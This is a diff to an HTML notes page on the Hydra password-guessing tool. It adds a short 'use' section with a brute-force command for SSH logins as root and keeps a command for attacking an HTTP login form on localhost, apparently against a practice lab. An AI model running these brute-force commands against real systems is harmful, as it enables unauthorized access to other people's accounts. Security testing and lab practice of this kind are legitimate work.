@@ -64,10 +64,17 @@
 </pre></div>
 
 
+<h3 id="use">use</h3>
 <ul>
-<li>use</li>
+<li>ssh</li>
 </ul>
-<p>http post form attack</p>
+<div class="hlcode"><pre><span class="n">hydra</span> <span class="n">ip</span> <span class="o">-</span><span class="n">l</span> <span class="n">root</span> <span class="o">-</span><span class="n">P</span> <span class="n">pass</span><span class="p">.</span><span class="n">lst</span>
+</pre></div>
+
+
+<ul>
+<li>http post form attack</li>
+</ul>
 <div class="hlcode"><pre><span class="n">hydra</span> <span class="o">-</span><span class="n">l</span> <span class="n">admin</span> <span class="o">-</span><span class="n">P</span> <span class="n">pass</span><span class="p">.</span><span class="n">lst</span> <span class="o">-</span><span class="n">o</span> <span class="n">ok</span><span class="p">.</span><span class="n">lst</span> <span class="o">-</span><span class="n">t</span> <span class="mi">1</span> <span class="o">-</span><span class="n">f</span> <span class="mf">127.0.0.1</span> <span class="n">http</span><span class="o">-</span><span class="n">post</span><span class="o">-</span><span class="n">form</span> <span class="err">“</span><span class="o">/</span><span class="n">login</span><span class="p">.</span><span class="n">php</span><span class="o">:</span><span class="n">name</span><span class="o">=^</span><span class="n">USER</span><span class="o">^&amp;</span><span class="n">pwd</span><span class="o">=^</span><span class="n">PASS</span><span class="o">^:</span><span class="n">incorrect</span><span class="o">:</span><span class="n">H</span><span class="o">=</span><span class="n">Cookie</span><span class="o">:</span> <span class="n">security</span><span class="o">=</span><span class="n">low</span><span class="p">;</span> <span class="n">PHPSESSID</span><span class="o">=</span><span class="n">o7qiqd9fc1d003u9d38k64t0f4</span><span class="err">”</span>
 </pre></div>
 
